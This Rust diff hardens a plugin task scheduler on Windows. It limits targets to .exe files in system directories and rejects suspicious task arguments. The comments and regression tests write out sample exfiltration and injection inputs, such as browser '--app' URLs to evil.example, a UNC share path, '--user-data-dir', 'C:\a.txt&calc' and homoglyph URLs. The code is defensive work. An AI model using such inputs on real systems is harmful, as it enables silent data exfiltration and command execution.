@@ -61,8 +61,16 @@ pub fn init_db() -> anyhow::Result<()> {
     Ok(())
 }
 
-/// 允许被定时启动的文件扩展名（可执行类型）。
-const EXECUTABLE_EXTENSIONS: [&str; 4] = ["exe", "bat", "cmd", "lnk"];
+/// 允许作为定时任务目标的扩展名。
+///
+/// 只有 `.exe`。另外三类都各自对应一个确定缺陷，不是「暂未支持」：
+/// - `.bat` / `.cmd`：`CreateProcess` 不直接执行批处理，而是交给 `cmd.exe` 解释，
+///   且参数会被 cmd 二次解析（Rust 安全公告 RUSTSEC-2024-0037）。等于把黑名单里
+///   刻意封掉的 `cmd.exe` 用扩展名请回来，而脚本内容不受任何白名单约束。
+/// - `.lnk`：shell item 只有 `ShellExecute` 会解析，`CreateProcess` 直接失败，
+///   所以「能启动」从未成立；改用 `ShellExecute` 又会放行链接指向的任意程序
+///   （可以是 `cmd.exe`），整个白名单作废。要支持必须先解析出真实目标再校验。
+const EXECUTABLE_EXTENSIONS: [&str; 1] = ["exe"];
 
 /// 明确禁止作为定时任务目标的可执行文件名（小写）。
 ///
@@ -121,13 +129,47 @@ const ALLOWED_EXECUTABLES: [&str; 24] = [
     "powerpnt.exe",
 ];
 
-/// 目标文件名（小写）。
-fn target_file_name(target_path: &str) -> String {
-    std::path::Path::new(target_path.trim())
-        .file_name()
-        .and_then(|n| n.to_str())
-        .unwrap_or_default()
-        .to_ascii_lowercase()
+/// 内置白名单程序允许存放的目录（已 canonicalize，供组件前缀比较）。
+///
+/// 只比对文件名等于允许把任意程序改名成 `notepad.exe` 丢进临时目录，
+/// 因此内置白名单必须同时限制来源目录。
+fn trusted_exe_dirs() -> Vec<std::path::PathBuf> {
+    const KEYS: [&str; 5] = [
+        "WINDIR",
+        "SystemRoot",
+        "ProgramFiles",
+        "ProgramFiles(x86)",
+        "ProgramW6432",
+    ];
+    let mut dirs = Vec::new();
+    for key in KEYS {
+        if let Some(p) = std::env::var_os(key) {
+            let p = std::path::PathBuf::from(p);
+            dirs.push(p.canonicalize().unwrap_or(p));
+        }
+    }
+    dirs
+}
+
+/// Windows 路径大小写不敏感：按路径组件逐一比较，忽略 ASCII 大小写。
+fn is_under(root: &std::path::Path, dir: &std::path::Path) -> bool {
+    let mut r = root.components();
+    let mut d = dir.components();
+    loop {
+        match (r.next(), d.next()) {
+            (None, _) => return true,
+            (Some(_), None) => return false,
+            (Some(a), Some(b)) => {
+                let same = match (a.as_os_str().to_str(), b.as_os_str().to_str()) {
+                    (Some(x), Some(y)) => x.eq_ignore_ascii_case(y),
+                    _ => a == b,
+                };
+                if !same {
+                    return false;
+                }
+            }
+        }
+    }
 }
 
 /// `config.ini` `[scheduler] allow_extra` 追加的白名单（逗号分隔文件名）。
@@ -140,8 +182,75 @@ fn extra_allowed_executables() -> Vec<String> {
         .collect()
 }
 
-/// 校验任务目标路径：必须是绝对路径、指向已存在的可执行类型文件，
-/// 且文件名在白名单内、不在黑名单内。
+/// 参数总长度上限：超出即拒绝，避免把整份追踪数据塞进一个参数。
+const MAX_ARGS_LEN: usize = 260;
+
+/// 校验任务参数。
+///
+/// 定时任务是插件唯一的「带网络出口」通道：Lua 沙箱拿掉 io/os 后没有 socket，
+/// 但白名单里有 `chrome.exe`/`msedge.exe`/`firefox.exe`，于是
+/// `scheduler_add(..., "--app=https://evil/?d=<追踪数据>")` 就是一次静默外带。
+/// 本函数的口径是「只启动程序，不指挥程序」：
+/// - 拒绝开关（`-` 或 `/` 开头）：`--load-extension`、`--user-data-dir` 本身就是
+///   任意代码执行入口，比 URL 外带更严重；
+/// - 拒绝 URL 形态（含 `/`、`?`、`#`、`@`、`:` 非盘符）：外带的载体；
+/// - 拒绝 UNC（`\\server\share`）：会让白名单程序向对端发起 NTLM 认证，等于凭据外带；
+/// - 拒绝裸主机名（带 `.` 却不带 `\`，如 `www.attacker.tld`）：浏览器会把它当搜索词
+///   送进默认搜索引擎，同样泄漏内容；
+/// - 禁 shell 元字符与 `%VAR%` 展开、禁控制字符；
+/// - 非 ASCII 只允许出现在「盘符绝对路径」里（`C:\笔记\日报.txt`）。这样中文路径可用，
+///   又不必担心全角 `：／` 之类同形字绕过 scheme 判断——那条 token 不再是纯 ASCII，
+///   也没有盘符前缀，直接被同一规则拦掉。
+fn validate_task_args(args: &str) -> anyhow::Result<()> {
+    let t = args.trim();
+    if t.is_empty() {
+        return Ok(());
+    }
+    if t.chars().count() > MAX_ARGS_LEN {
+        anyhow::bail!("任务参数过长（上限 {MAX_ARGS_LEN} 字符）");
+    }
+    if t.chars().any(|c| c.is_control()) {
+        anyhow::bail!("任务参数不能包含控制字符");
+    }
+    for tok in t.split_whitespace() {
+        if tok.starts_with('-') || tok.starts_with('/') {
+            anyhow::bail!("任务参数不支持命令行开关（发现 {tok}）");
+        }
+        if tok.starts_with(r"\\") {
+            anyhow::bail!("任务参数不支持 UNC 路径（会触发对外主机的 NTLM 认证）");
+        }
+        if tok.contains([
+            '/', '&', '|', ';', '<', '>', '^', '%', '"', '\'', '?', '#', '@', '*',
+        ]) {
+            anyhow::bail!("任务参数包含被禁止的字符或 URL 形态（{tok}）");
+        }
+        // 唯一允许的 `:` 是盘符分隔符：`C:\...`
+        if let Some(i) = tok.find(':') {
+            let b = tok.as_bytes();
+            let is_drive = i == 1 && b[0].is_ascii_alphabetic() && b.get(i + 1) == Some(&b'\\');
+            if !is_drive {
+                anyhow::bail!("任务参数只能是本地绝对路径或简单名称（发现 {tok}）");
+            }
+        }
+        let drive_path = tok.as_bytes().len() > 3
+            && tok.as_bytes()[0].is_ascii_alphabetic()
+            && tok.as_bytes()[1] == b':'
+            && tok.as_bytes()[2] == b'\\';
+        if !drive_path {
+            if !tok.chars().all(|c| c.is_ascii_graphic()) {
+                anyhow::bail!("非盘符绝对路径的参数只能是可打印 ASCII（发现 {tok}）");
+            }
+            if tok.contains('.') && !tok.contains('\\') {
+                anyhow::bail!("任务参数需是带反斜杠的绝对路径，不接受裸主机名（{tok}）");
+            }
+        }
+    }
+    Ok(())
+}
+
+/// 校验任务目标路径：绝对路径、可 canonicalize（即真实存在且解析掉符号链接），
+/// 扩展名为 `.exe`，文件名在白名单内且不在黑名单内；
+/// 内置白名单还要求文件确实位于系统安装目录之一。
 ///
 /// 定时任务是持久化的进程启动通道，入口（插件 API / 未来 UI）统一在此拦截；
 /// [`execute_task`] 执行前还会再校验一次，防止库文件被外部改写后绕过入口。
@@ -169,19 +278,43 @@ fn validate_task_target(target_path: &str) -> anyhow::Result<()> {
                 .join(" / ")
         );
     }
-    let file_name = target_file_name(t);
+    // 必须 canonicalize：它把 `..\`、8.3 短名、符号链接/junction 全部还原成真实
+    // 路径，后续的文件名与来源目录判断才有意义（否则 `notepad.exe` 可以是任何文件）。
+    let canon = match p.canonicalize() {
+        Ok(c) => c,
+        Err(e) => anyhow::bail!("目标程序不可用: {t}（{e}）"),
+    };
+    let file_name = canon
+        .file_name()
+        .and_then(|n| n.to_str())
+        .unwrap_or_default()
+        .to_ascii_lowercase();
+    if !file_name.ends_with(".exe") {
+        anyhow::bail!("canonicalize 后目标不是 .exe: {file_name}");
+    }
     if BLOCKED_EXECUTABLES.contains(&file_name.as_str()) {
         anyhow::bail!("{file_name} 属于被禁止的解释器/系统程序，不能作为定时任务目标");
     }
     let extra = extra_allowed_executables();
-    if !ALLOWED_EXECUTABLES.contains(&file_name.as_str()) && !extra.contains(&file_name) {
+    let from_extra = extra.contains(&file_name);
+    if !ALLOWED_EXECUTABLES.contains(&file_name.as_str()) && !from_extra {
         anyhow::bail!(
             "{file_name} 不在定时任务白名单内；如需放行请在 config.ini 的 \
              [scheduler] allow_extra 中添加该文件名"
         );
     }
-    if !p.is_file() {
-        anyhow::bail!("目标程序不存在: {t}");
+    // 内置白名单只保证「这个文件名可信」，来源目录必须同时可信；
+    // 用户在 allow_extra 里写的文件名是他自己的显式授权，不再限制目录。
+    if !from_extra {
+        let parent = canon.parent().unwrap_or(&canon);
+        let trusted = trusted_exe_dirs();
+        if !trusted.iter().any(|root| is_under(root, parent)) {
+            anyhow::bail!(
+                "{file_name} 不在系统安装目录内（实际位置 {}），可能是改名后的其他程序；\
+                 确实需要请在 config.ini 的 [scheduler] allow_extra 中登记该文件名",
+                parent.display()
+            );
+        }
     }
     Ok(())
 }
@@ -195,7 +328,7 @@ pub fn add_task(
     schedule_time: &str,
     enabled: bool,
 ) -> i64 {
-    if let Err(e) = validate_task_target(target_path) {
+    if let Err(e) = validate_task_target(target_path).and_then(|_| validate_task_args(args)) {
         tracing::warn!("添加定时任务被拒绝（{name}）: {e}");
         return -1;
     }
@@ -238,6 +371,12 @@ pub fn update_task(
     // 修改目标路径时同样校验（不修改 target 字段则跳过，避免目标被删后无法编辑其他字段）
     if let Some(t) = target_path {
         if let Err(e) = validate_task_target(t) {
+            tracing::warn!("更新定时任务被拒绝（id={id}）: {e}");
+            return false;
+        }
+    }
+    if let Some(a) = args {
+        if let Err(e) = validate_task_args(a) {
             tracing::warn!("更新定时任务被拒绝（id={id}）: {e}");
             return false;
         }
@@ -437,9 +576,10 @@ fn execute_task(t: &ScheduledTask) {
     if t.target_path.is_empty() {
         return;
     }
-    // 纵深防御：入口已校验，这里再校验一次。库里可能有历史白名单外记录，
-    // 也可能被外部程序直接改写 —— 执行前的这道检查保证不会启动任意程序。
-    if let Err(e) = validate_task_target(&t.target_path) {
+    // 纵深防御：入口已校验，这里再校验一次。库里可能有历史白名单外记录
+    // （旧版曾放行 .bat/.cmd/.lnk），也可能被外部程序直接改写 —— 执行前的这道
+    // 检查保证既不会启动任意程序，也不会把 URL/开关类参数交给浏览器。
+    if let Err(e) = validate_task_target(&t.target_path).and_then(|_| validate_task_args(&t.args)) {
         tracing::warn!("定时任务被拒绝执行（{}）: {e}", t.name);
         return;
     }
@@ -645,5 +785,111 @@ mod tests {
             return;
         }
         assert!(validate_task_target(notepad).is_ok());
+    }
+
+    /// 回归：只比对文件名等于允许把任意程序改名成 `calc.exe` 丢进临时目录。
+    /// canonicalize 后必须同时校验来源目录，且 `..\` 写法不能成为漏网或误杀。
+    #[test]
+    fn renamed_copy_in_untrusted_dir_is_rejected() {
+        let _g = isolate_app_dir("untrusted");
+        let Some(windir) = std::env::var_os("WINDIR") else {
+            return; // 无系统目录概念（非 Windows）
+        };
+        let windir = windir.to_string_lossy().to_string();
+        let dir = std::env::temp_dir().join(format!("ff_sched_untrusted_{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let fake = dir.join("calc.exe");
+        std::fs::write(&fake, b"MZ\x90\x00not a real calculator").unwrap();
+
+        let e = validate_task_target(&fake.to_string_lossy())
+            .expect_err("改名成白名单名字、但位于临时目录的程序必须被拒绝");
+        assert!(
+            e.to_string().contains("不在系统安装目录"),
+            "错误信息应说明被拒原因，实际: {e}"
+        );
+        // 同一文件换成 `..\` 写法同样被拦：证明校验的是解析后的真实位置
+        let smuggled = dir.join("..").join("calc.exe");
+        assert!(validate_task_target(&smuggled.to_string_lossy()).is_err());
+
+        // 系统目录内的 `..\` 写法不该被误杀（canonicalize 后仍在受信目录）
+        let plain = format!("{windir}\\System32\\notepad.exe");
+        if validate_task_target(&plain).is_ok() {
+            let traversed = format!("{windir}\\..\\Windows\\System32\\notepad.exe");
+            assert!(
+                validate_task_target(&traversed).is_ok(),
+                "{traversed} 解析后就是 notepad.exe，不应因写法被拒绝"
+            );
+        }
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    /// 回归：`.bat`/`.cmd` 经被禁的 `cmd.exe` 解释、`.lnk` 根本起不来（且链接目标
+    /// 可以是任意程序），三者都必须在入口被拒绝。
+    #[test]
+    fn script_and_shell_link_targets_are_rejected() {
+        let _g = isolate_app_dir("script");
+        let dir = std::env::temp_dir().join(format!("ff_sched_script_{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        for name in ["daily.bat", "daily.cmd", "notepad.lnk", "notepad.txt"] {
+            let p = dir.join(name);
+            std::fs::write(&p, b"x").unwrap();
+            let e = validate_task_target(&p.to_string_lossy())
+                .expect_err("{name} 不能作为定时任务目标");
+            assert!(
+                e.to_string().contains("仅支持 .exe"),
+                "{name} 应被扩展名拦下，实际: {e}"
+            );
+        }
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    /// 回归：插件可用 `scheduler_add` 给白名单浏览器传任意参数，而 Lua 沙箱没有
+    /// socket —— 浏览器就是它的网络出口，追踪数据会被拼进 URL 外带。
+    #[test]
+    fn exfil_shaped_args_are_rejected() {
+        let _g = isolate_app_dir("args");
+        for bad in [
+            "--app=https://evil.example/?keys=1234",
+            "https://evil.example/a",
+            "www.evil.example",
+            r"\\evil.example\share\x",
+            "--user-data-dir=C:\\ev",
+            "C:\\a.txt&calc",
+            "C:\\%TEMP%\\x",
+            "mailto:x@evil.example",
+            // 全角同形字：Chromium 的 scheme 解析只认 ASCII `:`，但仍应被拒
+            "https：／／evil.example",
+            "ｅｖｉｌ．ｅxample",
+        ] {
+            assert!(validate_task_args(bad).is_err(), "可疑参数应被拒绝: {bad}");
+        }
+        // 合法用法不能一并打死
+        for ok in [
+            "",
+            "C:\\notes\\日报.txt",
+            "C:\\Windows\\System32\\config.ini",
+        ] {
+            assert!(validate_task_args(ok).is_ok(), "合法参数应放行: {ok}");
+        }
+    }
+
+    /// 入口与执行前两道校验都要挡下坏参数（库被外部改写的情形）。
+    #[test]
+    fn add_task_rejects_bad_args_without_storing() {
+        let _g = isolate_app_dir("args_entry");
+        let notepad = r"C:\Windows\notepad.exe";
+        if !std::path::Path::new(notepad).is_file() {
+            return;
+        }
+        let id = add_task(
+            "exfil",
+            notepad,
+            "--app=https://evil.example/?d=1",
+            "daily",
+            "09:00",
+            true,
+        );
+        assert_eq!(id, -1, "坏参数不应入库");
+        assert!(get_all_tasks().is_empty());
     }
 }
